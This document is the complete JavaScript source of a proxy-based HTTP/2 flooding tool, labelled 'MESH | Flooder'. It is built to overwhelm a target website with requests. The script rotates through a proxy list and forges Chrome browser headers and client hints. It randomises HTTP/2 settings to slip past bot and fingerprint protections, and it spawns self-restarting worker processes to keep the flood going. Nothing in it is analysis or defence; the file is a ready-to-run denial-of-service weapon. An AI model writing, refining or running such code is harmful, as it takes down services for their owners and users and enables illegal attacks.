const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const url = require('url');
const os = require('os');
const http2 = require('http2-wrapper');

const [target, time, threads, ratelimit, proxyfile, mode] = process.argv.slice(2);

if (target == undefined) {
    console.log('[MESH | Flooder] 31.12.2023 23:59 last update <3');
    process.exit(-1);
}

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const parsed = url.parse(target);
let headers_sent = 0;
let headers_full = 0;
let proxy_using = 0;
let proxy_count = proxies.length;

let frame_1 = 65536;
let frame_2 = 6291456;
let frame_3 = 262144;
let frame_4 = 1000;
let frame_5 = 15000;

let min = 119;
let max = 120;

var osVersion1 = 'Windows NT 10.0; Win64; x64';

const osVersions_default = [
    'Windows NT 10.0; Win64; x64',
    'Macintosh; Intel Mac OS X 10_15_7',
    'Macintosh; Intel Mac OS X 10_14_6',
    'Macintosh; Intel Mac OS X 10_13_6',
    'Macintosh; Intel Mac OS X 10_12_6',
    'Macintosh; Intel Mac OS X 10_11_6',
    'Macintosh; Intel Mac OS X 10_10_5',
    'Macintosh; Intel Mac OS X 10_9_5',
    'Macintosh; Intel Mac OS X 10_8_5',
    'Macintosh; Intel Mac OS X 10_7_5',
    'Macintosh; Intel Mac OS X 10_6_8',
];

const agent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
    maxFreeSockets: Infinity,
    timeout: time * 1000,
});

setInterval(() => {
    osVersion1 = osVersions_default[Math.floor(Math.random() * osVersions_default.length)];
    if (min >= 101) {
        max = max + 1;
        min = min + 1;
    } else if (min <= 120) {
        max = max - 1;
        min = min - 1;
    } else {
        max = 120;
        min = 119;
    }
}, 1000);

function getRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function generateheadersone() {
    let browserVersion_default = Math.floor(Math.random() * (max - min + 1)) + min;
    let clientVersion = Math.floor(Math.random() * (99 - 5 + 1)) + 99;
    let frame_test = Math.floor(Math.random() * (100 - 2 + 1)) + 2;

    if (proxy_using >= proxy_count) {
        proxy_using = 1;
    }

    let using_frames = proxy_count - proxy_using;
    clientVersion = clientVersion + using_frames;

    var platformVersion;
    if (osVersion1.includes("Windows")) {
        platformVersion = "Windows";
    } else if (osVersion1.includes("Linux")) {
        platformVersion = "Linux";
    } else if (osVersion1.includes("iOS")) {
        platformVersion = "iOS";
    } else if (osVersion1.includes("Mac")) {
        platformVersion = "MacOS";
    } else {
        platformVersion = "Windows";
    }

    const header = {
        ":method": "GET",
        ":authority": parsed.host,
        ":scheme": "https",
        ":path": parsed.path,
    }

    if (headers_sent >= 1) {
        header["cache-control"] = "max-age=0";
    }


    header["sec-ch-ua"] = `"Not_A Brand";v="${clientVersion}", "Chromium";v="${browserVersion_default}", "Google Chrome";v="${browserVersion_default}"`;

    const headertwo = {
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `"${platformVersion}"`,
        "upgrade-insecure-requests": "1",
    }

    headertwo["user-agent"] = `Mozilla/5.0 (${osVersion1}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion_default}.0.0.0 Safari/537.36`;

    if (headers_sent <= 1) {
        headertwo["sec-purpose"] = "prefetch;prerender";
        headertwo["purpose"] = "prefetch";
    }


    const headerthree = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        ...(Math.random() < 0.5 && { 'sec-fetch-site': 'none' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-mode': 'navigate' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-user': '?0' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-dest': 'document' }),
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': `en-US,en;q=0.9,es-ES;q=0.8,es;q=0.${using_frames}`
    }

    for (let i = 0; i < 7; i++) {
        if (Math.random() < 0.5) {
            header[`custom-x-${getRandomString(7)}`] = `${getRandomString(2)}-${getRandomString(4)}=${getRandomString(4)}`;
        }
        if (Math.random() < 0.5) {
            header[`custom-x-uthen${getRandomString(5)}`] = `${getRandomString(3)}-${getRandomString(3)}=${getRandomString(6)}`;
        }        
    }

    const numframesandrate1 = Math.floor(ratelimit / 4);
    const numframesandrate2 = Math.floor(ratelimit / 2);

    if (headers_sent >= numframesandrate1 && headers_sent <= numframesandrate2) {
        if (frame_1 > 65000 && frame_2 > 6291000 && frame_3 > 262000) {
            frame_1 = frame_1 - frame_test + using_frames;
            frame_2 = frame_2 - frame_test + using_frames;
            frame_3 = frame_3 - frame_test + using_frames;
            frame_4 = frame_4 + frame_test + using_frames;
            frame_5 = frame_5 + frame_test + using_frames;
        } else if (frame_1 < 65999 && frame_2 < 6291999 && frame_3 < 262999) {
            frame_1 = frame_1 + frame_test - using_frames;
            frame_2 = frame_2 + frame_test - using_frames;
            frame_3 = frame_3 + frame_test - using_frames;
            frame_4 = frame_4 - frame_test + using_frames;
            frame_5 = frame_5 - frame_test + using_frames;
        } else {
            frame_1 = 65536 - using_frames;
            frame_2 = 6291456 - using_frames;
            frame_3 = 262144 - using_frames;
            frame_4 = 1000 - frame_test + using_frames;
            frame_5 = 15000 - frame_test + using_frames;
        }
    } else {
        frame_1 = 65536;
        frame_2 = 6291456;
        frame_3 = 262144;
        frame_4 = 1000;
        frame_5 = 15000;
    }

    const fullheader = { ...header, ...headertwo, ...headerthree };
    return fullheader;
}

function work() {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    proxy_using++;
    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        agent,
        path: `${parsed.host}:443`,
        headers: { 'Connection': 'Keep-Alive' },
        rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const ciphers = ["TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"].join(":");
        const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                servername: parsed.host,
                session: head,
                agent,
                secure: true,
                requestOCSP: true,
                ALPNProtocols: ["h2", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
            }),
            settings: {
                ...(Math.random() < 0.5 && { headerTableSize: frame_1 }),
                enablePush: false,
                ...(Math.random() < 0.5 && { maxConcurrentStreams: frame_4 }),
                ...(Math.random() < 0.5 && { maxFrameSize: frame_5 }),
                ...(Math.random() < 0.5 && { initialWindowSize: frame_2 }),
                ...(Math.random() < 0.5 && { maxHeaderListSize: frame_3 }),
            },
        };

        const sessionState = { flags: 0 };

        const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
            session.setLocalWindowSize(15663105);
        });

        let activeRequests = 0;
        let timeoutHandle;

        const resetTimeout = () => {
            headers_sent = 0;
            clearTimeout(timeoutHandle);
            timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
        };

        const closeSessionIfDone = () => {
            if (!activeRequests) {
                sessionState.flags |= 1;
                session.destroy();
            }
        };

        session.on('error', () => {
            sessionState.flags |= 1;
            session.destroy();
        });

        session.on('connect', () => {
            Array.from({ length: ratelimit }).forEach((_, index) => {
                requestHandler(session);
            });
            resetTimeout();
        });

        const requestHandler = (session) => {
            const req = session.request(generateheadersone());
            req.setEncoding('utf8');
            req.end();
            headers_sent++;
            headers_full++;

            function finalizeRequest() {
                activeRequests--;
                closeSessionIfDone();
            }

            req.on('ready', () => {
                finalizeRequest();
            });

            req.on('headers', (headers) => {
                finalizeRequest();
            });

            req.on('data', (chunk) => { });

            req.on('end', finalizeRequest);
            req.on('error', (err) => {
                finalizeRequest();
            });
        };


    });

    request.end();
};


function getRandomValue(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(console.log('Primary process exiting...')), time * 1000);

} else {
    setInterval(work);
    setTimeout(() => process.exit(console.log(`Worker ${process.pid} exiting...`)), time * 1000);
}